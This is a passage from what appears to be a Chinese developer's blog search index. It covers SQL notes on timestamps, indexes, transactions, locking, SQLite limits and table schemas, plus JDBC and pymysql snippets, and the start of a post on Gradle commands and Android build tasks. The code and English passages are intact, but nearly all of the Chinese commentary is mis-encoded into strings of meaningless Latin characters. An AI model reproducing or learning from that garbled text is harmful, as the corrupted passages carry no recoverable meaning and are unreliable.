ORDERS.CUSTOMER_ID; æ—¶é—´æˆ³è¿™ä¸€éƒ¨åˆ†åº”è¯¥å±äºsqlçš„å‡½æ•°äº† SELECT CURDATE(); // YYYY-MM-DDæ ¼å¼ 2018-02-10 select now(); // 2018-02-10 15:49:10 æƒ³è¦æ—¶é—´æˆ³çš„è¯å¯ä»¥è¿™ä¹ˆå¹² SELECT unix_timestamp(); // 1518249025 select unix_timestamp(&#39;2008-08-08&#39;); // 1218124800 select unix_timestamp(CURDATE()); //1518192000 // insertä¸€è¡Œçš„æ—¶å€™è‡ªåŠ¨è®¾ç½®æ’å…¥çš„æ—¶é—´æˆ³ï¼Œå½“ç„¶ç®€å•äº†. Create Table Student ( Name varchar(50), DateOfAddmission datetime default CURRENT_TIMESTAMP ); /*ä¸‹é¢è¿™ä¸ªä¹Ÿæ˜¯è¡Œçš„ï¼ŒCURRENT_TIMESTAMPæ˜¯ä¸€ä¸ªå…³é”®å­—*/ CREATE TABLE foo ( creation_time DATETIME DEFAULT CURRENT_TIMESTAMP, modification_time DATETIME ON UPDATE CURRENT_TIMESTAMP ) modification_time DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP å»ºç´¢å¼•(Advanced sql)å¸¸å¸¸å¬åå°çš„äººè¯´ï¼Œè¿™ä¸ªsqlæŸ¥è¯¢å¤ªæ…¢äº†ï¼Œè¦å»ºç´¢å¼•å“ˆã€‚ä½†æ˜¯ç´¢å¼•å¯¹äºæé«˜æŸ¥è¯¢æ€§èƒ½ä¹Ÿä¸æ˜¯ä¸‡èƒ½çš„ï¼Œä¹Ÿä¸æ˜¯å»ºç«‹è¶Šå¤šçš„ç´¢å¼•å°±è¶Šå¥½ã€‚ç´¢å¼•å»ºå°‘äº†ï¼Œç”¨ WHERE å­å¥æ‰¾æ•°æ®æ•ˆç‡ä½ï¼Œä¸åˆ©äºæŸ¥æ‰¾æ•°æ®ã€‚ç´¢å¼•å»ºå¤šäº†ï¼Œä¸åˆ©äºæ–°å¢ã€ä¿®æ”¹å’Œåˆ é™¤ç­‰æ“ä½œï¼Œå› ä¸ºåšè¿™äº›æ“ä½œæ—¶ï¼ŒSQL SERVER é™¤äº†è¦æ›´æ–°æ•°æ®è¡¨æœ¬èº«ï¼Œè¿˜è¦è¿å¸¦ç«‹å³æ›´æ–°æ‰€æœ‰çš„ç›¸å…³ç´¢å¼•ï¼Œè€Œä¸”è¿‡å¤šçš„ç´¢å¼•ä¹Ÿä¼šæµªè´¹ç¡¬ç›˜ç©ºé—´ã€‚ æŸ¥äº†ä¸‹ CREATE INDEX PersonIndex ON Person (LastName) ; //åä¸º &quot;PersonIndex&quot;ï¼Œåœ¨ Person è¡¨çš„ LastName åˆ—ï¼š sqlå»ºç´¢å¼•ä¸»è¦æ˜¯ä¸ºäº†æŸ¥æ‰¾çš„æ—¶å€™èƒ½å¤Ÿè·Ÿç¿»å­—å…¸ä¸€æ ·å¿«ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œä¸»é”®ï¼Œå¤–é”®åº”è¯¥å»ºç´¢å¼•ï¼Œé¢‘ç¹æ›´æ–°çš„åˆ—å°±ä¸è¦æ›´æ–°ç´¢å¼•äº† CREATE INDEX salary_index ON COMPANY(salary); // åˆ›å»ºç´¢å¼• SELECT * FROM COMPANY INDEXED BY salary_index WHERE salary &gt; 5000; //åˆ›å»ºå¥½äº†ä¹‹åå°±è¦æ ¹æ®indexæ¥æŸ¥äº† é€‚åˆå»ºç´¢å¼•çš„åˆ—æ˜¯å‡ºç°åœ¨WHEREå­å¥ä¸­çš„åˆ—ï¼Œæˆ–è€…joinå­å¥(onè¯­å¥)ä¸­æŒ‡å®šçš„åˆ—ï¼Œå°±æ˜¯è¯´é‚£äº›è¢«å½“åšæ¡ä»¶çš„ä¸œè¥¿åº”è¯¥ä½œä¸ºç´¢å¼•ã€‚ ç´¢å¼•ä¸è¦æå¾—å¤ªå¤šï¼Œå»ºç«‹ç´¢å¼•å’Œç»´æŠ¤ç´¢å¼•éƒ½æ¯”è¾ƒè€—æ—¶ã€‚update,delete,insertéƒ½è¦ç»´æŠ¤ç´¢å¼• Transaction äº‹åŠ¡ Atomicity âˆ’ ensures that all operations within the work unit are completed successfully. Otherwise, the transaction is aborted at the point of failure and all the previous operations are rolled back to their former state. Consistency âˆ’ ensures that the database properly changes states upon a successfully committed transaction. Isolation âˆ’ enables transactions to operate independently of and transparent to each other. Durability âˆ’ ensures that the result or effect of a committed transaction persists in case of a system failure. è®ºACIDæ˜¯ä»€ä¹ˆäº‹åŠ¡çš„å†™æ³• BEGIN; DELETE FROM CUSTOMERS WHERE AGE = 25; ROLLBACK; //å›æ»š COMMIT; //æäº¤æ›´æ”¹ SAVEPOINT SAVEPOINT_NAME; ROLLBACK TO SAVEPOINT_NAME; language supportjavajavaçš„ç‰ˆæœ¬accessing-data-mysql package com.vae.jdbc; import java.sql.Connection; import java.sql.DriverManager; import java.sql.PreparedStatement; import java.sql.ResultSet; import java.sql.SQLException; public class JDBCtest { //æ•°æ®åº“è¿æ¥åœ°å€ public final static String URL = &quot;jdbc:mysql://localhost:3306/JDBCdb&quot;; //ç”¨æˆ·å public final static String USERNAME = &quot;root&quot;; //å¯†ç  public final static String PASSWORD = &quot;smyh&quot;; //é©±åŠ¨ç±» public final static String DRIVER = &quot;com.mysql.jdbc.Driver&quot;; public static void main(String[] args) { // TODO Auto-generated method stub //insert(p); //update(p); //delete(3); insertAndQuery(); } //æ–¹æ³•ï¼šä½¿ç”¨PreparedStatementæ’å…¥æ•°æ®ã€æ›´æ–°æ•°æ® public static void insertAndQuery(){ Connection conn = null; try { Class.forName(DRIVER); conn = DriverManager.getConnection(URL, USERNAME, PASSWORD); String sql1 = &quot;insert into user(name,pwd)values(?,?)&quot;; String sql2 = &quot;update user set pwd=? where name=?&quot;; PreparedStatement ps = conn.prepareStatement(sql1); // è¿™è¡Œå…¶å®æ¯”è¾ƒè´¹æ€§èƒ½ ps.setString(1, &quot;smyhvae&quot;); ps.setString(2, &quot;007&quot;); ps.executeUpdate(); ps = conn.prepareStatement(sql2); ps.setString(1, &quot;008&quot;); ps.setString(2, &quot;smyh&quot;); ps.executeUpdate(); ps.close(); conn.close(); } catch (ClassNotFoundException e) { e.printStackTrace(); } catch (SQLException e) { e.printStackTrace(); } } } Springé‡Œé¢ç”¨çš„æ˜¯jpa pythonçš„ç‰ˆæœ¬python-mysql python3ä¸å†æ”¯æŒmysqldb è¯·ç”¨pymysqlå’Œmysql.connector import pymysql conn = pymysql.connect(host=â€™127.0.0.1â€™, port=3306, user=â€™rootâ€™, passwd=â€™testâ€™, db=â€™mysqlâ€™) cur = conn.cursor() cur.execute(â€œSELECT * FROM userâ€) for r in cur.fetchall(): print(r) #cur.close() conn.close() å®é™…å¼€å‘ä¸­éƒ½ç”¨çš„ormæ¡†æ¶,sqlAlchemy nodejsusing mysql in node js æ›´æ–°SQLiteæ”¯æŒäº‹åŠ¡ï¼Œè¿™å°±ä»¥å¤–è¿™éœ€è¦åœ¨å¹¶å‘ç¯å¢ƒä¸‹ï¼Œä¿æŒäº‹åŠ¡çš„ACIDç‰¹æ€§ã€‚Sqliteçš„é”å®ç°åŸºäºæ–‡ä»¶é”ï¼Œå¯¹äºLinuxç³»ç»Ÿï¼Œæ–‡ä»¶é”ä¸»è¦åŒ…å«ååŒé”å’Œå¼ºåˆ¶é”ã€‚ sqliteä¸æ”¯æŒåˆ é™¤column,ç¡®å®šæ— ç–‘SQLite supports a limited subset of ALTER TABLE. The ALTER TABLE command in SQLite allows the user to rename a table or to add a new column to an existing table. It is not possible to rename a column, remove a column, or add or remove constraints from a table.It is not possible to rename a column, remove a column, or add or remove constraints from a tableã€‚//æ›´æ”¹çº¦æŸä¹Ÿä¸è¡Œ alter table record drop column name; //æŠ¥é”™ //ä¸€ç§å‘¨è½¬çš„æ–¹æ³•create table temp as select recordId, customer, place, time from record where 1 = 2; //å¤åˆ¶recordçš„è¡¨ç»“æ„ï¼Œä¸åŒ…å«å†…å®¹drop table record;alter table temp rename to record; // Sqliteçš„ä¼˜åŒ–æ‰‹æ®µ beginTransaction DB.compileStatement(â€œDELETE FROM users WHERE first_name = ?â€)//èŠ‚çœäº†æ¯æ¬¡parse sqlè¯­å¥çš„å¼€é”€ sqliteä¸€æ¬¡æ’å…¥å¤šæ¡è®°å½•çš„ä¼˜åŒ–æ–¹æ³•ï¼Œä½¿ç”¨union è§‚å¯Ÿåˆ°ä¸€ä¸ªç°è±¡ï¼Œåœ¨ç¼–è¾‘æ•°æ®åº“ï¼Œæ•°æ®åº“æ‰“å¼€çš„æƒ…å†µä¸‹ï¼Œtest.dbæ‰€åœ¨çš„æ–‡ä»¶å¤¹ä¸‹é¢åŒæ—¶ç”Ÿæˆäº†ä¸€ä¸ªtest.db.journalæ–‡ä»¶ï¼Œä¸€æ—¦å…³é—­æ•°æ®åº“è¿æ¥ï¼Œè¿™ä¸ªæ–‡ä»¶å°±æ²¡äº†ã€‚ ä½ çš„æ•°æ®åº“ç”¨ä»€ä¹ˆå­˜å‚¨å¼•æ“ï¼ŸåŒºåˆ«æ˜¯ï¼Ÿç­”æ¡ˆï¼šå¸¸è§çš„æœ‰MyISAMå’ŒInnoDBã€‚MyISAMï¼šä¸æ”¯æŒå¤–é”®çº¦æŸã€‚ä¸æ”¯æŒäº‹åŠ¡ã€‚å¯¹æ•°æ®å¤§æ‰¹é‡å¯¼å…¥æ—¶ï¼Œå®ƒä¼šè¾¹æ’å…¥æ•°æ®è¾¹å»ºç´¢å¼•ï¼Œæ‰€ä»¥ä¸ºäº†æé«˜æ‰§è¡Œæ•ˆç‡ï¼Œåº”è¯¥å…ˆç¦ç”¨ç´¢å¼•ï¼Œåœ¨å®Œå…¨å¯¼å…¥åå†å¼€å¯ç´¢å¼•ã€‚InnoDBï¼šæ”¯æŒå¤–é”®çº¦æŸï¼Œæ”¯æŒäº‹åŠ¡ã€‚å¯¹ç´¢å¼•éƒ½æ˜¯å•ç‹¬å¤„ç†çš„ï¼Œæ— éœ€å¼•ç”¨ç´¢å¼•ã€‚ è”è¡¨ä¸€å¯¹å¤šæŸ¥è¯¢è”è¡¨å¤šå¯¹å¤šæŸ¥è¯¢ Another choicemariadb MariaDbæ˜¯åœ¨oracleæ”¶è´­mysqlä¹‹åï¼Œç¤¾åŒºforkçš„ä¸€ä¸ªmysqlç‰ˆæœ¬ï¼Œé™¤äº†packagenameä¸ä¸€æ ·ä»¥å¤–ï¼Œæ“ä½œéƒ½å·®ä¸å¤šã€‚PostgreSQL å»ºè¡¨è¯­å¥: DROP TABLE IF EXISTS `user`; CREATE TABLE `user` ( `user_id` bigint(20) unsigned NOT NULL AUTO_INCREMENT, `user_name` varchar(60) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT &#39;&#39;, `user_password` varchar(30) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT &#39;&#39;, `user_nickname` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT &#39;&#39;, `user_email` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT &#39;&#39;, PRIMARY KEY (`user_id`), KEY `user_name` (`user_name`), CREATE TABLE `news` (`news_id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,`news_author` int(6) NOT NULL DEFAULT &#39;0&#39;,`news_date` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,`news_content` longtext COLLATE utf8mb4_unicode_ci NOT NULL,`news_title` text COLLATE utf8mb4_unicode_ci NOT NULL,`news_excerpt` text COLLATE utf8mb4_unicode_ci NOT NULL,`news_status` varchar(20) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT &#39;publish&#39;,`news_modified` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,`news_category` int(4) NOT NULL,PRIMARY KEY (`news_id`), KEY `type_status_date` (`news_status`,`news_date`,`news_id`),KEY `post_author` (`news_author`)) ENGINE=InnoDB AUTO_INCREMENT=15 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci; mysql&gt; describe user;+â€”â€”â€”â€”â€”+â€”â€”â€”â€”â€”â€”â€”+â€”â€”+â€”â€“+â€”â€”â€”+â€”â€”â€”â€”â€”-+| Field | Type | Null | Key | Default | Extra |+â€”â€”â€”â€”â€”+â€”â€”â€”â€”â€”â€”â€”+â€”â€”+â€”â€“+â€”â€”â€”+â€”â€”â€”â€”â€”-+| user_id | bigint(20) unsigned | NO | PRI | NULL | auto_increment || user_name | varchar(60) | NO | MUL | | || user_password | varchar(30) | NO | | | || user_nickname | varchar(50) | YES | | | || user_email | varchar(100) | NO | MUL | | |+â€”â€”â€”â€”â€”+â€”â€”â€”â€”â€”â€”â€”+â€”â€”+â€”â€“+â€”â€”â€”+â€”â€”â€”â€”â€”-+5 rows in set (0.00 sec) mysql&gt; describe news;+â€”â€”â€”â€”â€”+â€”â€”â€”â€”â€”â€”â€”+â€”â€”+â€”â€“+â€”â€”â€”â€”â€”â€”-+â€”â€”â€”â€”â€”-+| Field | Type | Null | Key | Default | Extra |+â€”â€”â€”â€”â€”+â€”â€”â€”â€”â€”â€”â€”+â€”â€”+â€”â€“+â€”â€”â€”â€”â€”â€”-+â€”â€”â€”â€”â€”-+| news_id | bigint(20) unsigned | NO | PRI | NULL | auto_increment || news_author | int(6) | NO | MUL | 0 | || news_date | datetime | NO | | CURRENT_TIMESTAMP | || news_content | longtext | NO | | NULL | || news_title | text | NO | | NULL | || news_excerpt | text | NO | | NULL | || news_status | varchar(20) | NO | MUL | publish | || news_modified | datetime | NO | | CURRENT_TIMESTAMP | || news_category | int(4) | NO | | NULL | |+â€”â€”â€”â€”â€”+â€”â€”â€”â€”â€”â€”â€”+â€”â€”+â€”â€“+â€”â€”â€”â€”â€”â€”-+â€”â€”â€”â€”â€”-+9 rows in set (0.00 sec) springå®˜æ–¹ç»™çš„æ‰‹æŠŠæ‰‹æ•™ç¨‹å¾ˆè¯¦ç»†ä¹è§‚é”(éœ€è¦è‡ªå·±å®ç°æˆ–è€…ä½¿ç”¨ormæ¡†æ¶)å’Œæ‚²è§‚é”(æ•°æ®åº“è‡ªå¸¦).æ‚²è§‚é”åŒ…æ‹¬å…±äº«é”å’Œæ’ä»–é”:å…±äº«é”: åœ¨æ‰§è¡Œsqlè¯­å¥å±è‚¡åé¢åŠ ä¸Šlock in share modeæ’ä»–é”ï¼šåœ¨æ‰§è¡Œsqlè¯­å¥å±è‚¡åé¢åŠ ä¸Šfor update ä¸¾ä¸ªä¾‹å­ï¼š begin; ##å¼€å¯ä¸€ä¸ªå®åŠ¡ï¼Œä¸commit SELECT * from city where id = &quot;1&quot; lock in share mode; update city set name=&quot;666&quot; where id =&quot;1&quot;; ##ä¼šerrorçš„ å¦å¤–è¿˜æœ‰è¡Œé”ï¼Œè¡¨é”è¡Œé”ï¼š SELECT * from city where id = â€œ1â€ lock in share mode;AUTO_INCREMENTæœ‰æ—¶å€™ä¸ä¼šä»1å¼€å§‹ mysqlæŸ¥çœ‹è¿æ¥æ•°ç”Ÿäº§ç¯å¢ƒMysqlåƒå†…å­˜ç‰¹åˆ«å‰å®³çš„è§£å†³é€”å¾„todo å»ºè¡¨ï¼Œå®æŸ¥ mysqlå­˜å‚¨ä¸­æ–‡æ•°æ®æœ‰ä»€ä¹ˆè¦æ³¨æ„çš„å˜› primary keyæ˜¯ä¸¤ä¸ªkeyçš„ç»„åˆä¹Ÿæ˜¯å¯ä»¥çš„mysql&gt; CREATE TABLE score( student_id INT UNSIGNED NOT NULL, event_id INT UNSIGNED NOT NULL, score INT NOT NULL, PRIMARY KEY(event_id, student_id)); pragmatic copy paste cheet sheet SELECT last_name,first_name,state FROM students WHERE first_name LIKE â€˜D%â€™ OR last_name LIKE â€˜%nâ€™ GROUP BY state;ERROR 1055 (42000): Expression #1 of SELECT list is not in GROUP BY clause and contains nonaggregated column â€˜Banana.students.last_nameâ€™ which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode=only_full_group_byæ”¹æˆ SELECT last_name,first_name,state FROM students WHERE first_name LIKE â€˜D%â€™ OR last_name LIKE â€˜%nâ€™ GROUP BY last_name,first_name,state; å¯ç”¨mysqlç¼“å­˜é™ä½cpuçš„ä½¿ç”¨ç‡ ç»å¸¸ä¼šçœ‹åˆ°ä¸€ä¸ª.sqlæ–‡ä»¶ï¼Œæ¯”æ–¹è¯´è¿™ä¸ªï¼Œæ€ä¹ˆå¯¼å‡ºæ¥çš„ï¼Ÿ qpså’Œtpsè¿™ç§æœ¯è¯­QPSï¼š Queries Per Secondæ„æ€æ˜¯â€œæ¯ç§’æŸ¥è¯¢ç‡â€ï¼Œæ˜¯ä¸€å°æœåŠ¡å™¨æ¯ç§’èƒ½å¤Ÿç›¸åº”çš„æŸ¥è¯¢æ¬¡æ•°ï¼Œæ˜¯å¯¹ä¸€ä¸ªç‰¹å®šçš„æŸ¥è¯¢æœåŠ¡å™¨åœ¨è§„å®šæ—¶é—´å†…æ‰€å¤„ç†æµé‡å¤šå°‘çš„è¡¡é‡æ ‡å‡†ã€‚ TPSï¼š æ˜¯TransactionsPerSecondçš„ç¼©å†™ï¼Œä¹Ÿå°±æ˜¯äº‹åŠ¡æ•°/ç§’ã€‚å®ƒæ˜¯è½¯ä»¶æµ‹è¯•ç»“æœçš„æµ‹é‡å•ä½ã€‚å®¢æˆ·æœºåœ¨å‘é€è¯·æ±‚æ—¶å¼€å§‹è®¡æ—¶ï¼Œæ”¶åˆ°æœåŠ¡å™¨å“åº”åç»“æŸè®¡æ—¶ï¼Œä»¥æ­¤æ¥è®¡ç®—ä½¿ç”¨çš„æ—¶é—´å’Œå®Œæˆçš„äº‹åŠ¡ä¸ªæ•°ã€‚","tags":[{"name":"sql","slug":"sql","permalink":"https://haldir65.github.io/tags/sql/"}]},{"title":"gradle commandè®°äº‹æœ¬","date":"2018-02-03T14:46:09.000Z","path":"2018/02/03/2018-02-03-gradle-command-explained/","text":"Gradleæ’ä»¶å¼€å‘ï¼Œå®˜æ–¹æ¨èçš„å…·å¤‡first class supprot çš„IDEåŒ…æ‹¬Android Studioå’ŒIntelij Ideaç­‰ã€‚Gradleçš„ç¼–è¯‘æµç¨‹åˆ†ä¸ºä¸‰æ­¥build_lifecycleInitialization -&gt; Configuration -&gt; Executionæ‰§è¡Œçš„å•ä½å«åšTaskGradleä½œä¸ºä¸€ä¸ªprogramï¼Œå¯ä»¥ä¸ºç¼–è¯‘ç¯å¢ƒè®¾ç½®çš„å‚æ•°å¾ˆå¤š Android dependency â€˜com.android.support:support-v4â€™ has different version for the compile (21.0.3) and runtime (26.1.0) classpath. You should manually set the same version via DependencyResolution ä¸€äº›å¸¸ç”¨çš„gradleçš„command å¦‚ä¸‹ gradlew :app:dependencies â€“configuration releaseCompileClasspath//å‰é¢è¿™ä¸ª:appåªæ˜¯ä»£è¡¨appè¿™ä¸ªprojectçš„gradle tasks â€“all ## æŸ¥çœ‹å½“å‰projectçš„æ‰€æœ‰tasksgradle taskA taskB ##å¤šä¸ªtaskæ˜¯å¯ä»¥åŒæ—¶æ‰§è¡Œçš„gradle â€“status ## æŸ¥çœ‹å½“å‰æ“ä½œç³»ç»Ÿä¸­è¿˜æœ‰é‚£äº›Daemonå¯ä»¥ç”¨ afterEvaluateæ˜¯å±äºprojectçš„å±æ€§(ä¹Ÿå¯ä»¥åœ¨allProjectä¸­åŠ ) I forced the version of support-v4 using this block in root build.gradle: subprojects { project.configurations.all { resolutionStrategy.eachDependency { details -&gt; if (details.requested.group == &#39;com.android.support&#39; &amp;&amp; !details.requested.name.contains(&#39;multidex&#39;) ) { details.useVersion &quot;$supportlib_version&quot; } } } } All com.android.support libraries must use the exact same version [duplicate] å…³äºgradlewåªæ˜¯ä¸€å±‚gradleçš„wrapperï¼Œæ‰¾åˆ°è¿™ä¹ˆä¸€æ®µè¯:The Gradle Wrapper is the preferred way of starting a Gradle build. It consists of a batch script for Windows and a shell script for OS X and Linux. These scripts allow you to run a Gradle build without requiring that Gradle be installed on your system. This used to be something added to your build file, but itâ€™s been folded into Gradle, so there is no longer any need. Instead, you simply use the following command. $ gradle wrapper â€“gradle-version 2.13 ./gradlew -v ç‰ˆæœ¬å·./gradlew clean æ¸…é™¤appç›®å½•ä¸‹çš„buildæ–‡ä»¶å¤¹./gradlew build æ£€æŸ¥ä¾èµ–å¹¶ç¼–è¯‘æ‰“åŒ…./gradlew assembleDebug ç¼–è¯‘å¹¶æ‰“DebugåŒ…./gradlew assembleRelease ç¼–è¯‘å¹¶æ‰“Releaseçš„åŒ…æˆ–è€…./gradlew aR./gradlew installRelease Releaseæ¨¡å¼æ‰“åŒ…å¹¶å®‰è£…æˆ–è€…./gradlew iR./gradlew uninstallRelease å¸è½½Releaseæ¨¡å¼åŒ… Androidé¡¹ç›®è¿ç§»åˆ°gradle 3.0éœ€è¦æ³¨æ„çš„ä¸€äº›äº‹ implementationå’Œapiçš„åŒºåˆ«ï¼š When your module configures an implementation dependency, itâ€™s letting Gradle know that the module does not want to leak the dependency to other modules at compile time. That is, the dependency is available to other modules only at runtime.Using this dependency configuration instead of api or compile can result in significant build time improvements because it reduces the amount of projects that the build system needs to recompile. For example, if an implementation dependency changes its API, Gradle recompiles only that dependency and the modules that directly depend on it. Most app and test modules should use this configuration.// a module ä½¿ç”¨implementationå¼•å…¥äº†æŸä¸ªdependencyï¼Œè¿™ä¸ªä¾èµ–å°±ä¸ä¼šæš´éœ²ç»™ä¾èµ–äºaçš„muduleã€‚ When a module includes an api dependency, itâ€™s letting Gradle know that the module wants to transitively export that dependency to other modules, so that itâ€™s available to them at both runtime and compile time. This configuration behaves just like compile (which is now deprecated), and you should typically use this only in library modules. Thatâ€™s because, if an api dependency changes its external API, Gradle recompiles all modules that have access to that dependency at compile time. So, having a large number of api dependencies can significantly increase build times. Unless you want to expose a dependencyâ€™s API to a separate test module, app modules should instead use implementation dependencies.//æ‰€ä»¥å¦‚æœæƒ³è¦æŠŠè‡ªå·±çš„æŸé¡¹ä¾èµ–æš´éœ²å‡ºå»ï¼Œè®©ä¾èµ–è‡ªå·±çš„muduleä¹Ÿèƒ½ç”¨åˆ°è¿™é¡¹ä¾èµ–ï¼Œå°±è¦ç”¨apiäº†ä½†æ˜¯apiå’Œä¹‹å‰çš„compileæ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥ç¼–è¯‘é€Ÿåº¦æ¯”implementationæ…¢å¾ˆå¤šã€‚ çœ‹åˆ°ä¸€ä»½å…³äºandroid build tasksè§£é‡Šçš„éå¸¸å¥½çš„æ–‡ç«  mergeDebugResourcesä»»åŠ¡çš„ä½œç”¨æ˜¯è§£å‹æ‰€æœ‰çš„aaråŒ…è¾“å‡ºåˆ°app/build/intermediates/exploded-aarï¼Œå¹¶ä¸”æŠŠæ‰€æœ‰çš„èµ„æºæ–‡ä»¶åˆå¹¶åˆ°app/build/intermediates/res/merged/debugç›®å½•é‡Œ processDebugManifestä»»åŠ¡æ˜¯æŠŠæ‰€æœ‰aaråŒ…é‡Œçš„AndroidManifest.xmlä¸­çš„èŠ‚ç‚¹ï¼Œåˆå¹¶åˆ°é¡¹ç›®çš„AndroidManifest.xmlä¸­ï¼Œå¹¶æ ¹æ®app/build.gradleä¸­å½“å‰buildTypeçš„manifestPlaceholdersé…ç½®å†…å®¹æ›¿æ¢manifestæ–‡ä»¶ä¸­çš„å ä½ç¬¦ï¼Œæœ€åè¾“å‡ºåˆ°app/build/intermediates/manifests/full/debug/AndroidManifest.xml processDebugResourcesçš„ä½œç”¨ 1ã€è°ƒç”¨aaptç”Ÿæˆé¡¹ç›®å’Œæ‰€æœ‰aarä¾èµ–çš„R.java,è¾“å‡ºåˆ°app/build/generated/source/r/debugç›®å½• 3ã€ç”Ÿæˆèµ„æºç´¢å¼•æ–‡ä»¶app/build/intermediates/res/resources-debug.ap_ 2ã€æŠŠç¬¦å·è¡¨è¾“å‡ºåˆ°app/build/intermediates/symbols/debug/R.txt compileDebugJavaWithJavacè¿™ä¸ªä»»åŠ¡æ˜¯ç”¨æ¥æŠŠjavaæ–‡ä»¶ç¼–è¯‘æˆclassæ–‡ä»¶ï¼Œè¾“å‡ºçš„è·¯å¾„æ˜¯app/build/intermediates/classes/debug ç¼–è¯‘çš„è¾“å…¥ç›®å½•æœ‰ - 1ã€é¡¹ç›®æºç ç›®å½•ï¼Œé»˜è®¤è·¯å¾„æ˜¯app/src/main/javaï¼Œå¯ä»¥é€šè¿‡sourceSetsçš„dslé…ç½®ï¼Œå…è®¸æœ‰å¤šä¸ªï¼ˆæ‰“å°project.android.sourceSets.main.java.srcDirså¯ä»¥æŸ¥çœ‹å½“å‰æ‰€æœ‰çš„æºç è·¯å¾„,å…·ä½“é…ç½®å¯ä»¥å‚è€ƒandroid-doc - 2ã€app/build/generated/source/aidl - 3ã€app/build/generated/source/buildConfig - 4ã€app/build/generated/source/apt(ç»§æ‰¿javax.annotation.processing.AbstractProcessoråšåŠ¨æ€ä»£ç ç”Ÿæˆçš„ä¸€äº›åº“ï¼Œè¾“å‡ºåœ¨è¿™ä¸ªç›®å½•ï¼Œå…·ä½“å¯ä»¥å‚è€ƒButterknife å’Œ Tinker)çš„ä»£ç  transformClassesWithJarMergingForDebugçš„ä½œç”¨æ˜¯æŠŠcompileDebugJavaWithJavacä»»åŠ¡çš„è¾“å‡ºapp/build/intermediates/classes/debugï¼Œå’Œapp/build/intermediates/exploded-aarä¸­æ‰€æœ‰çš„classes.jarå’Œlibsé‡Œçš„jaråŒ…ä½œä¸ºè¾“å…¥ï¼Œåˆå¹¶èµ·æ¥è¾“å‡ºåˆ°app/build/intermediates/transforms/jarMerging/debug/jars/1/1f/combined.jarï¼Œæˆ‘ä»¬åœ¨å¼€å‘ä¸­ä¾èµ–ç¬¬ä¸‰æ–¹åº“çš„æ—¶å€™æœ‰æ—¶å€™æŠ¥duplicate entry:xxx çš„é”™è¯¯ï¼Œå°±æ˜¯å› ä¸ºåœ¨åˆå¹¶çš„è¿‡ç¨‹ä¸­åœ¨ä¸åŒjaråŒ…é‡Œå‘ç°äº†ç›¸åŒè·¯å¾„çš„ç±» transformClassesWithMultidexlistForDebugè¿™ä¸ªä»»åŠ¡èŠ±è´¹çš„æ—¶é—´ä¹Ÿå¾ˆé•¿å°†è¿‘8ç§’ï¼Œå®ƒæœ‰ä¸¤ä¸ªä½œç”¨ - 1ã€æ‰«æé¡¹ç›®çš„AndroidManifest.xmlæ–‡ä»¶å’Œåˆ†æç±»ä¹‹é—´çš„ä¾èµ–å…³ç³»ï¼Œè®¡ç®—å‡ºé‚£äº›ç±»å¿…é¡»æ”¾åœ¨ç¬¬ä¸€ä¸ªdexé‡Œé¢,æœ€åæŠŠåˆ†æçš„ç»“æœå†™åˆ°app/build/intermediates/multi-dex/debug/maindexlist.txtæ–‡ä»¶é‡Œé¢ - 2ã€ç”Ÿæˆæ··æ·†é…ç½®é¡¹è¾“å‡ºåˆ°app/build/intermediates/multi-dex/debug/manifest_keep.txtæ–‡ä»¶é‡Œ é¡¹ç›®é‡Œçš„ä»£ç å…¥å£æ˜¯manifestä¸­applicationèŠ‚ç‚¹çš„å±æ€§android.nameé…ç½®çš„ç»§æ‰¿è‡ªApplicationçš„ç±»ï¼Œåœ¨android5.0ä»¥å‰çš„ç‰ˆæœ¬ç³»ç»Ÿåªä¼šåŠ è½½ä¸€ä¸ªdex(classes.dex)ï¼Œclasses2.dex .......classesN.dex ä¸€èˆ¬æ˜¯ä½¿ç”¨android.support.multidex.MultiDexåŠ è½½çš„ï¼Œæ‰€ä»¥å¦‚æœå…¥å£çš„Applicationç±»ä¸åœ¨classes.dexé‡Œ5.0ä»¥ä¸‹è‚¯å®šä¼šæŒ‚æ‰ï¼Œå¦å¤–å½“å…¥å£Applicationä¾èµ–çš„ç±»ä¸åœ¨classes.dexæ—¶åˆå§‹åŒ–çš„æ—¶å€™ä¹Ÿä¼šå› ä¸ºç±»æ‰¾ä¸åˆ°è€ŒæŒ‚æ‰ï¼Œè¿˜æœ‰å¦‚æœæ··æ·†çš„æ—¶å€™ç±»åå˜æ‰äº†ä¹Ÿä¼šå› ä¸ºå¯¹åº”ä¸äº†è€ŒæŒ‚æ‰,ç»¼ä¸Šæ‰€è¿°å°±æ˜¯è¿™ä¸ªä»»åŠ¡çš„ä½œç”¨ transformClassesWithDexForDebugè¿™ä¸ªä»»åŠ¡çš„ä½œç”¨æ˜¯æŠŠåŒ…å«æ‰€æœ‰classæ–‡ä»¶çš„jaråŒ…è½¬æ¢ä¸ºdexï¼Œclassæ–‡ä»¶è¶Šå¤šè½¬æ¢çš„è¶Šæ…¢ è¾“å…¥çš„jaråŒ…è·¯å¾„æ˜¯app/build/intermediates/transforms/jarMerging/debug/jars/1/1f/combined.jar è¾“å‡ºdexçš„ç›®å½•æ˜¯build/intermediates/transforms/dex/debug/folders/1000/1f/main app/build/intermediates/symbols/debug/R.txtè¿™ä¸ªæ–‡ä»¶é•¿è¿™æ · int anim abc_fade_in 0x7f010000int anim abc_fade_out 0x7f010001int anim abc_grow_fade_in_from_bottom 0x7f010002int anim abc_popup_enter 0x7f010003int anim abc_popup_exit 0x7f010004int anim abc_shrink_fade_out_from_bottom 0x7f010005int anim abc_slide_in_bottom 0x7f010006int anim abc_slide_in_top 0x7f010007int anim abc_slide_out_bottom 0x7f010008int anim abc_slide_out_top 0x7f010009int anim design_bottom_sheet_slide_in 0x7f01000aint anim design_bottom_sheet_slide_out 0x7f01000bint anim design_snackbar_in 0x7f01000cint anim design_snackbar_out 0x7f01000dint anim tooltip_enter 0x7f01000eint anim tooltip_exit 0x7f01000fint animator design_appbar_state_list_animator 0x7f020000int attr 